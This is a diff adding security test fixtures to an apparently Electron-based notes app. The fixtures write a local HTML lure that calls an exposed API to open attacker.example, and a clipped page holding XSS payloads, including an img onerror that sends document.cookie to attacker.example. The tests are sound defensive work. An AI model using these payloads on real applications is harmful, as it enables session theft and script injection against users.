@@ -693,3 +693,98 @@ export function writePythonShadowThoughtbase(rootIn: string): PythonShadowFixtur
   fs.writeFileSync(path.join(root, 'tb_helpers.py'), 'VALUE = 42\n');
   return { root, canaries, userModule: 'tb_helpers' };
 }
+
+// ── A local HTML lure and the links that reach it (H1: #2552 / #2554) ───────
+
+/**
+ * An `.html` file a shared thoughtbase can carry, which scripts against
+ * `window.api` if it ever becomes the main window's page, plus a note linking
+ * to it every way a note can: relative, the absolute `file://` URL of the
+ * copy in this root, and a `/Volumes/…` path to a copy on a mounted share.
+ * Clicking any of them must not navigate the window (the renderer guard), and
+ * main must refuse the navigation if it's attempted anyway.
+ */
+export const LOCAL_HTML_LURE_CANARY = 'LOCAL_HTML_LURE_RAN';
+
+export interface LocalHtmlLureFixture {
+  root: string;
+  /** The lure, relative to root. */
+  lureRel: string;
+  /** The `file://` URL of the lure in this root. */
+  lureFileUrl: string;
+  /** The note carrying the links, relative to root. */
+  noteRel: string;
+  /** Every href the note carries, in order. */
+  hrefs: string[];
+}
+
+export function writeLocalHtmlLureThoughtbase(rootIn: string): LocalHtmlLureFixture {
+  fs.mkdirSync(rootIn, { recursive: true });
+  const root = fs.realpathSync(rootIn);
+  const lureRel = 'attachments/lure.html';
+  fs.mkdirSync(path.join(root, 'attachments'), { recursive: true });
+  fs.writeFileSync(
+    path.join(root, lureRel),
+    `<!doctype html><title>Clipped page</title><script>
+document.title = ${JSON.stringify(LOCAL_HTML_LURE_CANARY)};
+if (window.api) window.api.shell.openExternal('https://attacker.example/?pwned=' + typeof window.api);
+</script>`,
+  );
+  const lureFileUrl = new URL(`file://${posix(path.join(root, lureRel))}`).href;
+  const hrefs = [
+    lureRel,
+    `./${lureRel}#section`,
+    lureFileUrl,
+    'file:///Volumes/Shared/lure.html',
+    '/Volumes/Shared/lure.html',
+  ];
+  const noteRel = 'reading-list.md';
+  fs.writeFileSync(
+    path.join(root, noteRel),
+    ['# Reading list', '', ...hrefs.map((h, i) => `- [Saved page ${i + 1}](${h})`), ''].join('\n'),
+  );
+  return { root, lureRel, lureFileUrl, noteRel, hrefs };
+}
+
+// ── A clipped web source whose body is live HTML (M2: #2558) ────────────────
+
+/**
+ * A source as the clipper or a web import leaves it: `meta.ttl` + a `body.md`
+ * whose text is HTML (turndown passes `<img onerror>` through verbatim), plus
+ * an excerpt so the annotated-reading export has something to highlight.
+ * Exporting it must render the HTML as text, with the excerpt still marked.
+ */
+export const CLIPPED_SCRIPT_SOURCE_ID = 'clipped-hostile-page';
+export const CLIPPED_SCRIPT_EXCERPT = 'a perfectly ordinary passage';
+
+export function writeClippedScriptSourceThoughtbase(rootIn: string): { root: string; sourceId: string } {
+  fs.mkdirSync(rootIn, { recursive: true });
+  const root = fs.realpathSync(rootIn);
+  const dir = path.join(root, '.minerva', 'sources', CLIPPED_SCRIPT_SOURCE_ID);
+  fs.mkdirSync(dir, { recursive: true });
+  fs.writeFileSync(
+    path.join(dir, 'meta.ttl'),
+    'this: a thought:WebPage ;\n  dc:title "Clipped page" ;\n  schema:url "https://attacker.example/page" .\n',
+  );
+  fs.writeFileSync(
+    path.join(dir, 'body.md'),
+    [
+      '# Clipped page',
+      '',
+      `Here is ${CLIPPED_SCRIPT_EXCERPT} worth quoting.`,
+      '',
+      '<img src=x onerror="fetch(\'https://attacker.example/?c=\'+document.cookie)">',
+      '',
+      '<script>alert(document.domain)</script>',
+      '',
+      '<a href="javascript:alert(1)">read more</a> <svg onload=alert(2)></svg>',
+      '',
+    ].join('\n'),
+  );
+  fs.mkdirSync(path.join(root, '.minerva', 'excerpts'), { recursive: true });
+  fs.writeFileSync(
+    path.join(root, '.minerva', 'excerpts', `${CLIPPED_SCRIPT_SOURCE_ID}-1.ttl`),
+    `this: a thought:Excerpt ;\n  thought:fromSource sources:${CLIPPED_SCRIPT_SOURCE_ID} ;\n  thought:citedText "${CLIPPED_SCRIPT_EXCERPT}" .\n`,
+  );
+  return { root, sourceId: CLIPPED_SCRIPT_SOURCE_ID };
+}
